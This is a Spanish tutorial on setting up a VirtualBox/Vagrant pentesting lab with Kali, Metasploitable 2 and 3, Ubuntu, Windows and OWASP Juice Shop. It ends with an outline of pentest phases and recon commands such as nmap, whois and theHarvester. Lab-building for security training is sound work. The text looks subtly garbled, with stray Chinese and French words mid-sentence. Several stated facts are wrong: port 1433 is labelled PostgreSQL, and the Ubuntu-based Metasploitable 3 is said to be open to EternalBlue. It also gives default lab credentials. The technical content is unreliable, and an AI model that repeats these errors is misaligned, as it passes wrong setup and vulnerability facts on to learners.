# Guia Completa de Virtualizacion y Hacking Etico

---

## 1. Fundamentos de Virtualizacion

### 1.1. Que es un Hipervisor?

Un hipervisor es un software que permite crear y ejecutar maquinas virtuales. Acts como capa intermedia entre el hardware fisico y los sistemas operativos virtuales.

**Tipos de Hipervisores:**

| Tipo | Nombre | Ejemplos | Caracteristicas |
|------|--------|----------|----------------|
| **Tipo 1 (Bare Metal)** | Nativo | VMware ESXi, Microsoft Hyper-V, Xen | Se instala directamente sobre el hardware. Mayor rendimiento. Usado en servidores de produccion. |
| **Tipo 2 (Hosted)** | Hospedado | VirtualBox, VMware Workstation, Parallels | Se instala sobre un sistema operativo existente. Ideal para desarrollo y pruebas. |

VirtualBox es un hipervisor de Tipo 2. Esto significa que necesitas un sistema operativo base (host) y sobre el se ejecutan las maquinas virtuales (guests).

### 1.2. Diferencias entre Maquinas Virtuales y Contenedores

| Caracteristica | Maquina Virtual | Contenedor |
|---------------|-----------------|------------|
| **Aislamiento** | Completo. Cada VM tiene su propio kernel | Comparte el kernel del host |
| **Arranque** | Minutos | Segundos |
| **Taille** | Gigabytes (2-50 GB tipico) | Megabytes |
| **Rendimiento** | Overhead del 5-10% | Overhead minimo, casi nativo |
| **Sistema operativo** | Cualquier SO | Solo el mismo kernel que el host |
| **Seguridad** | Aislamiento fuerte, permite analisis de malware | Aislamiento mas debil |
| **Casos de uso** | Pentesting, analisis de malware, laboratorio multi-SO | Despliegue de aplicaciones, microservicios |

```
+------------------------------------------+
|              MAQUINA VIRTUAL             |
|  +------------------------------------+  |
|  |  SISTEMA OPERATIVO GUEST           |  |
|  |  +------------------------------+  |  |
|  |  |  APLICACIONES               |  |  |
|  |  +------------------------------+  |  |
|  |  |  LIBRERIAS Y DEPENDENCIAS   |  |  |
|  |  +------------------------------+  |  |
|  |  |  KERNEL (propio)            |  |  |
|  +------------------------------------+  |
|  +------------------------------------+  |
|  |  HIPERVISOR                        |  |
+------------------------------------------+
                  |
                  v
+------------------------------------------+
|         HARDWARE FISICO (HOST)           |
|  CPU | RAM | DISCO | RED                 |
+------------------------------------------+
```

```
+------------------------------------------+
|              CONTENEDOR                  |
|  +------------------------------------+  |
|  |  APLICACION + DEPENDENCIAS        |  |
|  +------------------------------------+  |
+------------------------------------------+
                  |
                  v
+------------------------------------------+
|        MOTOR DE CONTENEDORES             |
|     (Docker, Podman, containerd)         |
+------------------------------------------+
                  |
                  v
+------------------------------------------+
|         KERNEL DEL HOST (compartido)     |
+------------------------------------------+
                  |
                  v
+------------------------------------------+
|         HARDWARE FISICO (HOST)           |
+------------------------------------------+
```

### 1.3. Conceptos Clave de VirtualBox

- **Host (Anfitrion):** Sistema operativo principal instalado en el hardware fisico.
- **Guest (Invitado):** Sistema operativo que se ejecuta dentro de la maquina virtual.
- **Virtual Disk:** Archivo que simula un disco duro fisico para la VM.
- **Snapshot:** Estado guardado de la VM en un momento especifico.
- **NAT:** Network Address Translation, permite salida a internet.
- **Bridged Adapter:** La VM se conecta directamente a la red fisica.
- **Host-Only:** Red privada solo entre host y guests.
- **Internal Network:** Red privada solo entre VMs, sin acceso al host.

---

## 2. Tipos de Redes en VirtualBox

VirtualBox ofrece cinco modos de conectividad de red. Comprender cada uno es fundamental para configurar tu laboratorio de pentesting.

### 2.1. No Conectado

**Descripcion:** La VM tiene una tarjeta de red virtual instalada pero no esta conectada a ninguna red.

**Casos de uso:**
- Analisis de malware que no debe comunicarse externamente
- Estudios forenses donde no quieres ninguna comunicacion de red
- Cuando necesitas断开 completamente la conectividad

**Configuracion:**
```
VirtualBox > Maquina > Configuracion > Red > Adaptador 1 > No conectado
```

### 2.2. NAT (Network Address Translation)

**Descripcion:** La VM sale a internet a traves de la IP del host. Es el modo por defecto en VirtualBox. Las VMs pueden acceder a internet pero no son accesibles desde el host ni de otras VMs.

**Diagrama:**
```
+----------+       +------------+       +----------+
|  VM      | --->  |  VirtualBox| --->  |  Internet|
|  (10.0.2.15)     |  NAT       |       |          |
+----------+       +------------+       +----------+
                         |
                         v
                    +----------+
                    |  Host    |
                    +----------+
```

**Caracteristicas:**
- IP automatica: 10.0.2.15 (por defecto, varia segun adaptadores)
- La VM puede navegar, descargar actualizaciones
- El host NO puede acceder a servicios de la VM directamente
- Otras VMs NO pueden comunicarse con esta VM

**Casos de uso:**
- VMs que solo necesitan internet
- Cuando no necesitas acceso desde el host a la VM
- Instalacion inicial de sistemas operativos

**Puertos comunes accesibles:**
- 10.0.2.2 = Gateway (normalmente la IP del router real)
- 10.0.2.3 = DNS del host
- 10.0.2.4 a 10.0.2.254 = Servicios del host (si hay port forwarding)

### 2.3. NAT Network

**Descripcion:** Similar a NAT pero permite que multiples VMs se comuniquen entre si. Creas una red NAT aislada donde todas las VMs comparten la misma gateway.

**Diagrama:**
```
+----------+
|  VM Kali |----+
+----------+    |
               v
         +------------+       +----------+
         | NAT Network| --->  |  Internet|
         |  10.0.3.0/24       |          |
         +------------+       +----------+
               ^
+----------+    |
|  VM Meta |----+
+----------+
```

**Configuracion desde terminal:**
```bash
# Crear una red NAT
VBoxManage natnetwork add --netname lab_red --network "10.0.3.0/24" --enable

# Iniciar la red NAT
VBoxManage natnetwork start --netname lab_red

# Ver redes NAT existentes
VBoxManage list natnetworks

# Ver informacion de una red NAT
VBoxManage natnetwork info --netname lab_red
```

**Caracteristicas:**
- Todas las VMs en la misma red NAT pueden verse
- Todas tienen acceso a internet
- El mundo exterior no puede iniciar conexiones hacia las VMs
- IP automatica dentro del rango de la red NAT

**Casos de uso:**
- Laboratorio de pentesting donde las VMs deben comunicarse
- Simulaciones de red donde quieres aislamiento de la red real
- Cuando necesitas que varias VMs tengan internet y se vean entre si

### 2.4. Bridged Adapter (Adaptador Puente)

**Descripcion:** La VM se conecta directamente a la red fisica del host. Recibe una IP del mismo rango DHCP que el host (o configuracion manual).

**Diagrama:**
```
+----------+       +----------+       +------------+
|  VM      | --->  |  Switch   | --->  |  Router    |
|  (192.168.1.50)  |  Fisico   |       |  (Gateway) |
+----------+       +----------+       +------------+
                         |
+----------+             |
|  Host    |-------------+
|  (192.168.1.100)
+----------+
```

**Caracteristicas:**
- La VM recibe IP del DHCP de tu red local
- La VM es visible en tu red local como cualquier otro dispositivo
- El host y la VM se ven mutuamente
- Si tu red tiene internet, la VM tendra internet
- La VM recibe la misma configuracion de red que equipos reales

**Casos de uso:**
- Cuando necesitas que la VM sea accesible desde la red
- Pruebas en entornos que simulan produccion
- Cuando quieres que otros dispositivos en tu red accedan a servicios de la VM

### 2.5. Host-Only Adapter (Solo Anfitrion)

**Descripcion:** Crea una red privada virtual entre el host y las VMs. Las VMs se ven entre si y con el host, pero NO tienen acceso a internet (sin configuracion adicional).

**Diagrama:**
```
+----------+
|  Host    |
|  (192.168.56.1)
+----------+
     |
     +-----> [vboxnet0] (192.168.56.0/24)
              |
     +--------+--------+
     |                 |
+----------+    +----------+
|  VM 1    |    |  VM 2    |
| (56.101) |    | (56.102) |
+----------+    +----------+
```

**Configuracion desde terminal:**
```bash
# Ver adaptadores Host-Only existentes
VBoxManage list hostonlyifs

# Crear un adaptador Host-Only
VBoxManage hostonlyif create

# Configurar IP del adaptador
VBoxManage hostonlyif ipconfig vboxnet0 --ip 192.168.56.1 --netmask 255.255.255.0

# Configurar DHCP en el adaptador Host-Only
VBoxManage dhcpserver add --ifname vboxnet0 --ip 192.168.56.1 --netmask 255.255.255.0 --lowerip 192.168.56.101 --upperip 192.168.56.254 --enable
```

**Caracteristicas:**
- Red privada 192.168.56.0/24 (configurable)
- VMs visibles entre si y con el host
- NO hay acceso automatico a internet
- Aislamiento total de la red externa

**Casos de uso:**
- Laboratorios de pentesting aislados
- Cuando no quieres que las VMs tengan contacto con la red externa
- Entornos de formacion seguros
- analisis de malware

### 2.6. Internal Network (Red Interna)

**Descripcion:** Similar a Host-Only pero sin incluir el host. Solo las VMs pueden comunicarse entre si.

**Diagrama:**
```
+----------+
|  VM 1    |----+
+----------+    |   Red Interna
               v   "pentest_lab"
+----------+    |
|  VM 2    |----+
+----------+
```

**Configuracion:**
```bash
# Configurar en VirtualBox GUI
# O desde terminal:
VBoxManage modifyvm "nombre_vm" --nic<x> intnet --intnet<nombre>
```

**Caracteristicas:**
- Las VMs se ven entre si unicamente
- El host NO ve las VMs en esta red
- Internet NO disponible
- Totalmente aislado

**Casos de uso:**
- Simulaciones de ataques entre VMs
- Cuando necesitas redes completamente aisladas
- Escaneos de vulnerabilidades sin riesgo para la red real

---

## 3. Configuracion de Red Recomendada para Laboratorio de Pentesting

Para un laboratorio de pentesting funcional necesitas que todas las VMs se vean entre si y que Kali tenga internet para descargar herramientas.

### 3.1. Topologia de Red Propuesta

```
+-------------------------------------------------------+
|                    RED EXTERNA (Bridge/NAT)           |
|                 Internet para Kali Linux              |
+-------------------------------------------------------+
                          |
                          v
+-------------------------------------------------------+
|                    RED INTERNA (Host-Only)            |
|                 192.168.56.0/24                      |
|                                                       |
|  +----------+  +----------+  +----------+  +---------+|
|  | Kali     |  | Meta 2   |  | Meta 3   |  | Ubuntu ||
|  | (56.101) |  | (56.102) |  | (56.103) |  |(56.104)||
|  +----------+  +----------+  +----------+  +---------+|
|                         ^                               |
|                    Atacante                            |
+-------------------------------------------------------+
```

### 3.2. Configuracion Paso a Paso de la Red

#### Paso 1: Crear el Adaptador Host-Only

```bash
# 1. Abrir terminal de comandos

# 2. Crear adaptador Host-Only
VBoxManage hostonlyif create

# 3. Configurar la IP del adaptador (esto sera la gateway para las VMs)
VBoxManage hostonlyif ipconfig "VirtualBox Host-Only Network #X" --ip 192.168.56.1 --netmask 255.255.255.0

# 4. Habilitar servidor DHCP en el adaptador
VBoxManage dhcpserver add --ifname "VirtualBox Host-Only Network #X" --ip 192.168.56.1 --netmask 255.255.255.0 --lowerip 192.168.56.101 --upperip 192.168.56.254 --enable

# 5. Verificar que el adaptador esta activo
VBoxManage list hostonlyifs
```

#### Paso 2: Configurar Cada Maquina Virtual

Para cada VM, necesitas configurar dos adaptadores de red:

| Maquina | Adaptador 1 (NAT/Bridge) | Adaptador 2 (Host-Only) |
|---------|-------------------------|------------------------|
| Kali Linux | Bridge o NAT (internet) | Host-Only 192.168.56.101 |
| Metasploitable 2 | Sin conexion o Host-Only | Host-Only 192.168.56.102 |
| Metasploitable 3 | Sin conexion | Host-Only 192.168.56.103 |
| Ubuntu | Bridge o NAT (internet) | Host-Only 192.168.56.104 |
| Windows | Bridge o NAT (internet) | Host-Only 192.168.56.105 |

#### Paso 3: Configurar desde VirtualBox GUI

```
1. Seleccionar la VM > Configuracion
2. Ir a Red > Adaptador 1
   - Habilitar adaptador de red
   - Conectado a: NAT (para Kali) o Puente (Bridge) si prefieres IP estatica en tu red
   - Tipo de adaptador: Intel PRO/1000 MT Desktop (82540EM)

3. Ir a Red > Adaptador 2
   - Habilitar adaptador de red
   - Conectado a: Solo anfitrion (Host-Only)
   - Nombre: VirtualBox Host-Only Network (el que creaste)
   - Tipo de adaptador: Intel PRO/1000 MT Desktop

4. Hacer clic en Aceptar
```

#### Paso 4: Configurar IPs Estaticas en las VMs

**En Kali Linux (Host-Only - eth1 o enp0s3, verificar con ip a):**

```bash
# Ver interfaces de red
ip a

# Editar configuracion de red
sudo nano /etc/network/interfaces

# Agregar o modificar:
auto eth1
iface eth1 inet static
address 192.168.56.101
netmask 255.255.255.0
network 192.168.56.0
broadcast 192.168.56.255

# Reiniciar red
sudo systemctl restart networking
# O en versiones recientes de Kali:
sudo nm-connection-editor
```

**Alternativa moderna usando Netplan (Kali moderno):**

```bash
# Identificar la interfaz
ip a

# Editar configuracion
sudo nano /etc/netplan/00-installer-config.yaml

# Contenido:
network:
  version: 2
  ethernets:
    eth1:
      addresses:
        - 192.168.56.101/24
      nameservers:
        addresses:
          - 8.8.8.8
          - 8.8.4.4

# Aplicar
sudo netplan apply
```

**En Metasploitable 2:**

```bash
# Ver interfaces
ifconfig -a

# Editar configuracion de red
sudo nano /etc/network/interfaces

# Agregar:
auto eth1
iface eth1 inet static
address 192.168.56.102
netmask 255.255.255.0
network 192.168.56.0
broadcast 192.168.56.255

# Reiniciar
sudo /etc/init.d/networking restart
```

**En Metasploitable 3:**

```bash
# Metasploitable 3 es mas moderno, usa systemctl

# Ver interfaces
ip a

# Ir al directorio de configuracion de red
cd /etc/systemd/network

# Crear archivo de configuracion
sudo nano 10-eth1.network

# Contenido:
[Match]
Name=eth1

[Network]
Address=192.168.56.103/24

# Habilitar servicios de red
sudo systemctl enable systemd-networkd
sudo systemctl start systemd-networkd
```

**En Ubuntu Desktop:**

```bash
# Metodo grafico (recomendado para principiantes):
# 1. Clic en icono de red en la barra superior
# 2. Wired Settings > Gear icon
# 3. IPv4: Manual
# 4. Address: 192.168.56.104
# 5. Netmask: 255.255.255.0
# 6. Gateway: 192.168.56.1
# 7. DNS: 8.8.8.8, 8.8.4.4

# Metodo por terminal:
sudo nano /etc/netplan/00-installer-config.yaml

# Contenido:
network:
  version: 2
  renderer: NetworkManager
  ethernets:
    enp0s8:
      addresses:
        - 192.168.56.104/24
      gateway4: 192.168.56.1
      nameservers:
        addresses:
          - 8.8.8.8
          - 8.8.4.4

sudo netplan apply
```

**En Windows:**

```
1. Abrir Panel de Control > Centro de redes
2. Cambiar configuracion del adaptador
3. Doble clic en "VirtualBox Host-Only Network"
4. Propiedades > Protocolo de Internet version 4 (TCP/IPv4)
5. Usar la siguiente direccion IP:
   - IP: 192.168.56.105
   - Mascara: 255.255.255.0
   - Puerta de enlace: 192.168.56.1
   - DNS preferido: 8.8.8.8
   - DNS alternativo: 8.8.4.4
6. Aceptar > Cerrar
```

---

## 4. Vagrant: Provisionamiento Automatico de Maquinas Virtuales

### 4.1. Que es Vagrant?

Vagrant es una herramienta que permite crear y configurar entornos de desarrollo reproducibles y ligeros usando archivos de configuracion declarativos. Con Vagrant puedes automatizar la creacion de VMs, reduciendo significativamente el tiempo de configuracion.

### 4.2. Instalacion de Vagrant

```bash
# En Windows: Descargar desde https://www.vagrantup.com/downloads

# En Kali Linux / Ubuntu:
curl -fsSL https://apt.releases.hashicorp.com/gpg | sudo gpg --dearmor -o /usr/share/keyrings/hashicorp-archive-keyring.gpg
echo "deb [signed-by=/usr/share/keyrings/hashicorp-archive-keyring.gpg] https://apt.releases.hashicorp.com $(lsb_release -cs) main" | sudo tee /etc/apt/sources.list.d/hashicorp.list
sudo apt update && sudo apt install vagrant

# Verificar instalacion
vagrant --version
```

### 4.3. Comandos Basicos de Vagrant

```bash
# Inicializar un nuevo proyecto
vagrant init

# Inicializar con una box especifica
vagrant init kalilinux/rolling

# Iniciar la maquina virtual
vagrant up

# Conectar via SSH
vagrant ssh

# Ver estado de las maquinas
vagrant status

# Recargar la maquina (reiniciar con nueva configuracion)
vagrant reload

# Recargar con provisionamiento
vagrant reload --provision

# Pausar la maquina
vagrant suspend

# Reanudar maquina pausada
vagrant resume

# Apagar la maquina
vagrant halt

# Destruir la maquina y sus recursos
vagrant destroy

# Recargar configuracion sin reiniciar
vagrant reload

# Ver archivos de sincronizacion
vagrant rsync
```

### 4.4. Archivo Vagrantfile

El archivo Vagrantfile define la configuracion de tu entorno:

```ruby
# -*- mode: ruby -*-
# vi: set ft=ruby :

Vagrant.configure("2") do |config|
  
  # Configuracion comun para todas las VMs
  config.vm.box_check_update = false
  
  # ===== KALI LINUX =====
  config.vm.define "kali" do |kali|
    kali.vm.box = "kalilinux/rolling"
    kali.vm.hostname = "kali-lab"
    kali.vm.network "private_network", ip: "192.168.56.101"
    kali.vm.network "forwarded_port", guest: 80, host: 8080
    kali.vm.provider "virtualbox" do |vb|
      vb.memory = "4096"
      vb.cpus = 2
      vb.name = "Kali-Linux-Lab"
    end
    kali.vm.synced_folder "./data", "/vagrant_data"
  end
  
  # ===== METASPLOITABLE 2 =====
  config.vm.define "meta2" do |meta2|
    meta2.vm.box = "rapid7/metasploitable2"
    meta2.vm.hostname = "metasploitable2"
    meta2.vm.network "private_network", ip: "192.168.56.102"
    meta2.vm.provider "virtualbox" do |vb|
      vb.memory = "1024"
      vb.cpus = 1
      vb.name = "Metasploitable2-Lab"
    end
  end
  
  # ===== METASPLOITABLE 3 =====
  config.vm.define "meta3" do |meta3|
    meta3.vm.box = "rapid7/metasploitable3-ub1404"
    meta3.vm.hostname = "metasploitable3"
    meta3.vm.network "private_network", ip: "192.168.56.103"
    meta3.vm.provider "virtualbox" do |vb|
      vb.memory = "2048"
      vb.cpus = 2
      vb.name = "Metasploitable3-Lab"
    end
  end
  
  # ===== UBUNTU =====
  config.vm.define "ubuntu" do |ubuntu|
    ubuntu.vm.box = "ubuntu/jammy64"
    ubuntu.vm.hostname = "ubuntu-lab"
    ubuntu.vm.network "private_network", ip: "192.168.56.104"
    ubuntu.vm.provider "virtualbox" do |vb|
      vb.memory = "2048"
      vb.cpus = 2
      vb.name = "Ubuntu-Lab"
    end
    ubuntu.vm.provision "shell", inline: <<-SHELL
      apt-get update
      apt-get install -y open-vm-tools-desktop
    SHELL
  end
  
  # ===== WINDOWS =====
  config.vm.define "win10" do |win10|
    win10.vm.box = "gusztavvargadr/windows-10"
    win10.vm.hostname = "windows-lab"
    win10.vm.network "private_network", ip: "192.168.56.105"
    win10.vm.provider "virtualbox" do |vb|
      vb.memory = "4096"
      vb.cpus = 2
      vb.name = "Windows10-Lab"
    end
  end
  
end
```

### 4.5. Crear Laboratorio con Vagrant

```bash
# 1. Crear directorio para el laboratorio
mkdir ~/pentest-lab && cd ~/pentest-lab

# 2. Crear archivo Vagrantfile (copiar el contenido anterior)
nano Vagrantfile

# 3. Ver las VMs disponibles
vagrant status

# 4. Iniciar todas las maquinas
vagrant up

# 5. Ver estado
vagrant status

# 6. Conectar a Kali
vagrant ssh kali

# 7. Iniciar solo una maquina especifica
vagrant up meta2

# 8. Ver puertos forwards
vagrant port --machine kali
```

---

## 5. Instalacion de Sistemas Operativos

### 5.1. Instalacion de Kali Linux

**Descripcion:** Kali Linux es la distribucion de pentesting mas popular, basada en Debian. Viene con mas de 600 herramientas preinstaladas.

**Descarga:**
```
https://www.kali.org/get-kali/#kali-virtual-machines
```

**Configuracion recomendada en VirtualBox:**

| Parametro | Valor |
|-----------|-------|
| RAM | 4096 MB (minimo 2048 MB) |
| CPU | 2 nucleos (minimo 1) |
| Disco | 50-80 GB (dinamico) |
| Red Adaptador 1 | Bridge o NAT (internet) |
| Red Adaptador 2 | Host-Only (red laboratorio) |
| S.O. Huesped | Debian 64-bit |

**Pasos de instalacion:**

```
1. VirtualBox > Nueva
2. Nombre: Kali-Linux-Lab
3. Tipo: Linux
4. Version: Debian (64-bit)
5. Memoria: 4096 MB
6. Crear disco duro virtual ahora
7. VDI (VirtualBox Disk Image)
8. Dinamicamente asignado
9. Taille: 60 GB
10. Crear
11. Seleccionar la VM > Configuracion
12. Sistema > Procesador > 2 CPUs
13. Red > Adaptador 1 > NAT (o Bridge para IP en tu red)
14. Red > Adaptador 2 > Host-Only
15. Almacenamiento > Vaciar > Elegir archivo ISO de Kali
16. Iniciar la maquina virtual
17. Seleccionar "Graphical Install"
18. Seguir asistente de instalacion de Debian
19. Al terminar, iniciar sesion:
    - Usuario: root
    - Contraseña: toor (o la que configuraste)
```

### 5.2. Instalacion de Metasploitable 2

**Descripcion:** Maquina virtual vulnerable intencionalmente diseñada para practicar pentesting. Muy antigua (basada en Ubuntu 8.04) pero excelente para aprender.

**Descarga:**
```
https://sourceforge.net/projects/metasploitable/files/Metasploitable2/
```

**Configuracion recomendada:**

| Parametro | Valor |
|-----------|-------|
| RAM | 1024 MB |
| CPU | 1 nucleo |
| Disco | 10 GB |
| Red Adaptador 1 | Host-Only |
| S.O. Huesped | Linux 2.6 (32-bit) |

**Pasos:**

```
1. VirtualBox > Nueva
2. Nombre: Metasploitable2
3. Tipo: Linux
4. Version: Ubuntu (32-bit)
5. Memoria: 1024 MB
6. Crear disco duro > VDI > Dinamico > 10 GB
7. Configuracion > Red > Host-Only
8. Almacenamiento > Asignar ISO de Metasploitable2
9. Iniciar (arranca automaticamente, no requiere instalacion)
10. Credenciales por defecto:
    - Usuario: msfadmin
    - Contraseña: msfadmin
```

**Servicios vulnerables activos por defecto:**

| Puerto | Servicio | Version |
|--------|----------|---------|
| 21 | vsftpd | 2.3.4 |
| 22 | OpenSSH | 4.7p1 |
| 23 | Telnet | - |
| 25 | Postfix | - |
| 53 | BIND | 9.4.2 |
| 80 | Apache | 2.2.8 |
| 111 | RPCbind | - |
| 139 | Samba | 3.0.20 |
| 445 | Samba | 3.0.20 |
| 1433 | PostgreSQL | 8.3 |
| 3306 | MySQL | 5.0.51a |
| 5432 | PostgreSQL | 8.3 |
| 8180 | Apache Tomcat | 5.5 |

### 5.3. Instalacion de Metasploitable 3

**Descripcion:** Version moderna de Metasploitable, basada en Ubuntu 14.04. Incluye mas servicios modernos y vulnerabilidades actualizadas.

**Descarga:**
```
https://github.com/rsmusllp/breaching-defense/blob/main/MetaSploitable3.md
https://app.vagrantup.com/rapid7/boxes/metasploitable3-ub1404
```

**Instalacion con Vagrant (recomendado):**

```bash
# Metodo 1: Vagrant (mas rapido)
mkdir metasploitable3 && cd metasploitable3
vagrant init rapid7/metasploitable3-ub1404
vagrant up

# Metodo 2: Descarga directa (buscar en GitHub rapid7/metasploitable3)
# Requiere construir desde fuente o buscar builds pre-configuradas
```

**Configuracion manual en VirtualBox:**

| Parametro | Valor |
|-----------|-------|
| RAM | 2048 MB |
| CPU | 2 nucleos |
| Disco | 60 GB |
| Red | Host-Only |
| S.O. Huesped | Linux 64-bit (Ubuntu 14.04) |

**Credenciales Metasploitable 3:**

```
Usuario: vagrant
Contraseña: vagrant

Usuario: msfadmin
Contraseña: msfadmin

Usuario: root
Contraseña: toor
```

**Servicios vulnerables:**

| Puerto | Servicio | Vulnerabilidad |
|--------|----------|----------------|
| 22 | SSH |Credenciales debiles |
| 80 | HTTP | Aplicaciones web vulnerables |
| 443 | HTTPS | SSL mal configurado |
| 445 | SMB | MS17-010 (EternalBlue) |
| 3306 | MySQL | Credenciales por defecto |
| 5432 | PostgreSQL | Credenciales por defecto |
| 8080 | Tomcat | Manager app expuesta |
| 9200 | Elasticsearch |API expuesta sin auth |
| 27017 | MongoDB | Sin autenticacion |

### 5.4. Instalacion de Ubuntu

**Descarga:**
```
https://ubuntu.com/download/desktop
```

**Configuracion:**

| Parametro | Valor |
|-----------|-------|
| RAM | 2048 MB |
| CPU | 2 nucleos |
| Disco | 25 GB |
| Red Adaptador 1 | NAT (internet) |
| Red Adaptador 2 | Host-Only |

**Pasos:**

```
1. VirtualBox > Nueva > Ubuntu (64-bit)
2. RAM: 2048 MB, Disco: 25 GB
3. Asignar ISO de Ubuntu
4. Instalar con interfaz grafica
5. Configurar usuario y contraseña
6. Instalar VMware Tools o Guest Additions al terminar
```

### 5.5. Instalacion de Windows

**Descarga (evaluacion de 90 dias):**
```
https://developer.microsoft.com/en-us/windows/downloads/virtual-machines/
```

**Configuracion:**

| Parametro | Valor |
|-----------|-------|
| RAM | 4096 MB |
| CPU | 2 nucleos |
| Disco | 60 GB |
| Red Adaptador 1 | NAT |
| Red Adaptador 2 | Host-Only |

**Pasos:**

```
1. VirtualBox > Nueva > Windows 10 (64-bit)
2. RAM: 4096 MB, Disco: 60 GB
3. Asignar ISO de Windows
4. Instalar normalmente
5. Instalar Guest Additions al terminar
6. Configurar IP estatica en Host-Only adapter
```

---

## 6. Validacion de Conectividad y Configuracion de Red

Despues de instalar todas las VMs, es crucial verificar que la conectividad esta correctamente configurada.

### 6.1. Verificar Conectividad desde Kali Linux

```bash
# 1. Ver todas las interfaces de red
ip a
# o
ifconfig -a

# 2. Verificar que tienes IP en la red Host-Only (192.168.56.101)
ip addr show eth1

# 3. Probar conectividad al gateway (host)
ping 192.168.56.1 -c 4

# 4. Probar conectividad entre VMs
ping 192.168.56.102 -c 4  # Metasploitable 2
ping 192.168.56.103 -c 4  # Metasploitable 3
ping 192.168.56.104 -c 4  # Ubuntu
ping 192.168.56.105 -c 4  # Windows

# 5. Verificar salida a internet (importante para Kali)
ping 8.8.8.8 -c 4

# 6. Verificar resolucion DNS
ping google.com -c 4
nslookup google.com

# 7. Ver tabla de enrutamiento
ip route
# Ver output esperado:
# default via 10.0.2.2 dev eth0  (o tu gateway de internet)
# 192.168.56.0/24 dev eth1 proto kernel scope link src 192.168.56.101
```

### 6.2. Verificar Conectividad a Metasploitable

```bash
# Desde Kali, verificar que Metasploitables responden
ping 192.168.56.102 -c 4
ping 192.168.56.103 -c 4

# Verificar puertos abiertos en Metasploitable 2
nmap -sT 192.168.56.102 -p 1-1000

# Verificar puertos abiertos en Metasploitable 3
nmap -sT 192.168.56.103 -p 1-1000

# Escaneo rapido de todos los puertos
nmap -p- 192.168.56.102
nmap -p- 192.168.56.103
```

### 6.3. Configuracion de Puerto de Red en Windows (si aplica)

```powershell
# Abrir PowerShell como Administrador

# Ver adaptadores de red
Get-NetAdapter

# Ver configuracion IP
Get-NetIPAddress

# Ver tabla de enrutamiento
route print

# Probar conectividad
Test-Connection 192.168.56.1
Test-NetConnection 192.168.56.102
```

### 6.4. Verificar que Todas las VMs Estan en la Misma Red

```bash
# Script para verificar todas las VMs (ejecutar desde Kali)
#!/bin/bash

echo "=== VERIFICACION DE RED DEL LABORATORIO ==="
echo ""

hosts=("192.168.56.1:Host (Gateway)" "192.168.56.101:Kali" "192.168.56.102:Metasploitable2" "192.168.56.103:Metasploitable3" "192.168.56.104:Ubuntu" "192.168.56.105:Windows")

for entry in "${hosts[@]}"; do
    IFS=':' read -r ip desc <<< "$entry"
    echo -n "Probando $desc ($ip)... "
    if ping -c 1 -W 2 $ip > /dev/null 2>&1; then
        echo "OK"
    else
        echo "FALLO"
    fi
done

echo ""
echo "=== VERIFICACION DE SERVICIOS EN METASPLOITABLE 2 ==="
nmap -sV 192.168.56.102 -p 21,22,23,80,139,445,3306,5432 --open

echo ""
echo "=== VERIFICACION DE SERVICIOS EN METASPLOITABLE 3 ==="
nmap -sV 192.168.56.103 -p 22,80,443,445,3306,5432,8080,9200 --open
```

---

## 7. Instalacion de OWASP Juice Shop

### 7.1. Que es OWASP Juice Shop?

Es una aplicacion web intencionalmente vulnerable que abarca todo el Top 10 de OWASP. Es la forma mas moderna y completa de practicar pentesting web.

### 7.2. Instalacion en Kali Linux

```bash
# Actualizar sistema
sudo apt update && sudo apt upgrade -y

# Instalar Node.js (si no esta)
curl -fsSL https://deb.nodesource.com/setup_lts.x | sudo -E bash -
sudo apt install -y nodejs

# Verificar versiones
node --version
npm --version

# Instalar Git
sudo apt install -y git

# Clonar repositorio de Juice Shop
cd /opt
sudo git clone https://github.com/juice-shop/juice-shop.git

# Entrar al directorio
cd juice-shop

# Instalar dependencias
npm install

# Ejecutar en modo produccion
npm start

# La aplicacion estara disponible en:
# http://localhost:3000
```

### 7.3. Instalacion como Docker Container (Alternativa Recomendada)

```bash
# Instalar Docker
sudo apt install -y docker.io
sudo systemctl enable docker
sudo systemctl start docker

# Agregar usuario al grupo docker
sudo usermod -aG docker $USER
# Cerrar sesion y volver a entrar para aplicar cambios

# Descargar imagen de Juice Shop
docker pull bkimminich/juice-shop

# Ejecutar contenedor
docker run -d --name juice-shop -p 3000:3000 bkimminich/juice-shop

# Verificar que esta corriendo
docker ps

# Ver logs
docker logs juice-shop

# Acceder desde el navegador
# http://192.168.56.101:3000
```

### 7.4. Verificar Instalacion

```bash
# Desde Kali
curl http://localhost:3000

# Desde otra maquina
curl http://192.168.56.101:3000

# Probar con navegador grafico
firefox http://localhost:3000
```

### 7.5. Configuracion para Acceder desde Metasploitable

Si quieres instalar Juice Shop en Metasploitable 3 o Ubuntu:

```bash
# En Ubuntu o Metasploitable 3:
sudo apt update
sudo apt install -y nodejs npm git

cd /opt
sudo git clone https://github.com/juice-shop/juice-shop.git
cd juice-shop
npm install
npm start

# Configurar para que funcione en la red:
# Editar config.yml para bind a 0.0.0.0:
nano /opt/juice-shop/config.yml

# O ejecutar con:
HOST=0.0.0.0 npm start

# Ahora deberia ser accesible desde Kali en:
# http://192.168.56.104:3000 (Ubuntu)
# http://192.168.56.103:3000 (Metasploitable 3)
```

---

## 8. Ciclo de Hacking - Metodologia de Pentesting

El proceso de pentesting sigue un ciclo estructurado que garantiza una evaluacion completa y profesional.

### 8.1. Las Fases del Hacking Etico

```
+------------------------------------------------------------+
|                                                            |
|   +---------+     +---------+     +-----------+            |
|   |RECON    |---->| SCAN    |---->| ENUMERAC  |            |
|   |OCIMIENTO|     | VULNERAB|     | ACION     |            |
|   +---------+     +---------+     +-----------+            |
|        ^                                   |               |
|        |                                   v               |
|   +---------+     +---------+     +-----------+            |
|   |REPORTES|     |EXPLOTAC |---->| ACCESO    |            |
|   |         |     | ION     |     | MANTENIDO |            |
|   +---------+     +---------+     +-----------+            |
|                                                            |
+------------------------------------------------------------+
```

### 8.2. Fase 1: Reconocimiento (Recon)

**Objetivo:** Recopilar la maxima informacion posible sobre el objetivo.

**Tipos:**

**Reconocimiento Pasivo:**
- Busquedas en Google (Google Dorking)
- Redes sociales
- DNS lookups
- WHOIS queries
- Informacion publica

**Reconocimiento Activo:**
- Escaneo de puertos
- Ping sweeps
- Reconocimiento de servicios
- Traceroutes

**Herramientas en Kali:**

```bash
# Consultas WHOIS
whois empresa.com

# Informacion DNS
dig empresa.com
dig -x 192.168.56.102
nslookup empresa.com

# Buscar subdominios
amass enum -passive -d empresa.com

# Google Dorking
# site:empresa.com
# filetype:pdf
# intitle:"admin" "login"
# inurl:admin

# Recopilar emails
theHarvester -d empresa.com -b all
```

### 8.3. Fase 2: Escaneo (Scanning)

**Objetivo:** Identificar puertos abiertos, servicios y vulnerabilidades.

```bash
